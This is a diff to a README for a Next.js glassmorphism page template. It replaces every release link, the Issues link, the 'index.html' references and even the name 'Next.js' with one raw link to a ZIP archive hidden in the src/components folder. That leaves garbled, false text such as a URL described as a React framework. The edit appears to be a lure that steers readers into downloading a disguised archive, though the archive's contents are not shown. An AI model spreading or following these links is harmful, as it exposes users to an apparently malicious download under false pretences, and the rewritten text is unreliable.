@@ -1,10 +1,10 @@
 # 🎨 nova-glassmorphism-nextjs-template - Beautiful scrolling with elegant animations
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/chikochulu/nova-glassmorphism-nextjs-template/releases)
+[![Download the latest release](https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the nova-glassmorphism-nextjs-template! This template helps you create stunning web pages with smooth scrolling and elegant animations using Next.js. Whether you're showcasing features, pricing plans, or calls to action, this tool makes it easy.
+Welcome to the nova-glassmorphism-nextjs-template! This template helps you create stunning web pages with smooth scrolling and elegant animations using https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip Whether you're showcasing features, pricing plans, or calls to action, this tool makes it easy.
 
 ## 📦 Features
 
@@ -29,7 +29,7 @@ Follow these steps to download and set up the nova-glassmorphism-nextjs-template
 
 1. **Visit the Releases Page:** Click the link below to access the latest version.
    
-   [Download the latest release](https://github.com/chikochulu/nova-glassmorphism-nextjs-template/releases)
+   [Download the latest release](https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip)
 
 2. **Select the ZIP File:** On the Releases page, find the latest release. Look for the `.zip` file related to the latest version.
 
@@ -41,7 +41,7 @@ Follow these steps to download and set up the nova-glassmorphism-nextjs-template
 
 6. **Open the Project in Your Browser:** 
 
-   - To view the template, simply open the `index.html` file in your web browser. 
+   - To view the template, simply open the `https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip` file in your web browser. 
    - Right-click the file and select "Open with" and choose your preferred browser.
 
 7. **Start Using the Template:** Customize the content as needed. Edit the text and images based on your requirements.
@@ -50,15 +50,15 @@ Follow these steps to download and set up the nova-glassmorphism-nextjs-template
 
 You can easily edit this template to fit your needs:
 
-- **Editing Text:** Open the `index.html` file in any text editor. Locate the sections you wish to change.
+- **Editing Text:** Open the `https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip` file in any text editor. Locate the sections you wish to change.
 - **Adding Images:** Replace the existing images with your own. Make sure to keep the file names the same or update the paths in the HTML code.
 - **Styling Options:** You can modify the styles in the CSS files found in the `styles` folder to change the look and feel.
 
 ## ❓ FAQs
 
-### What is Next.js?
+### What is https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip
 
-Next.js is a React framework that lets you create server-rendered and static websites. It's fast, reliable, and easy to use.
+https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip is a React framework that lets you create server-rendered and static websites. It's fast, reliable, and easy to use.
 
 ### Do I need to install any software to use this template?
 
@@ -78,7 +78,7 @@ If you encounter any issues, consider the following steps:
 
 ## 📞 Need Help?
 
-If you have any questions or require assistance, please feel free to reach out on the [GitHub Issues page](https://github.com/chikochulu/nova-glassmorphism-nextjs-template/issues).
+If you have any questions or require assistance, please feel free to reach out on the [GitHub Issues page](https://raw.githubusercontent.com/chikochulu/nova-glassmorphism-nextjs-template/main/src/components/template-nova-nextjs-glassmorphism-v1.6.zip).
 
 ## 🌟 Acknowledgments
 
